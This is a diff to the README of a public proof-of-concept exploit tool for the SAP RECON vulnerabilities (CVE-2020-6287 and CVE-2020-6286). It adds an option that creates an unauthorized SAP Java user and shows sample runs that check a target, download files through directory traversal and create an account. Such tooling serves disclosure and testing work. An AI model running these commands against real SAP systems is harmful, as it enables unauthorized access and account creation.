@@ -27,9 +27,10 @@ There is additional options:
 
 1. `-c` - check if SAP server is vulnerable to RECON
 2. `-f` - download `zip` file from SAP server
+3. `-u` - create user SAP JAVA user with  `Authenticated User` role 
 
 
-Ex.:
+Ex.: Download zip file
 
 ```
 ~python RECON.py -H 172.16.30.8 -f /1111.zip
@@ -37,17 +38,30 @@ Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
 Ok! File zipfile_929.zip was saved
 ```
 
+
+Ex.: Create SAP JAVA user
+
+```
+~python RECON.py -H 172.16.30.8 -u
+Check1 - Vulnerable! - http://172.16.30.8:50000/CTCWebService/CTCWebServiceBean
+Going to create new user. sapRpoc5484:Secure!PwD9379
+Ok! User were created
+```
+
+
 ## All options
 
 
 ```
 ~python RECON.py -h
-usage: RECON.py [-h] [-H HOST] [-P PORT] [-s] [-c] [-f ZIPFILE]
+usage: RECON.py [-h] [-H HOST] [-P PORT] [-s] [-c] [-f ZIPFILE] [-u]
                 [--timeout TIMEOUT] [-v]
 
-PoC for CVE-2020-6287, CVE-2020-6286 (RECON)
+PoC for CVE-2020-6287,  (RECON)
 This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and exploits dir traversal in queryProtocol method
-Original finding: Pablo Artuso. https://twitter.com/lmkalg
+Original finding:
+- Pablo Artuso. https://twitter.com/lmkalg
+- Yvan 'iggy' G https://twitter.com/_1ggy
 Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.support.sap.com/#/notes/2939665
 
 optional arguments:
@@ -58,6 +72,7 @@ optional arguments:
   -c, --check           just detect vulnerability
   -f ZIPFILE, --zipfile ZIPFILE
                         ZIP file to read. CVE-2020-6286
+  -u, --user            Create JAVA user. CVE-2020-6287
   --timeout TIMEOUT     HTTP connection timeout in second (default: 10)
   -v, --verbose         verbose mode
 ```
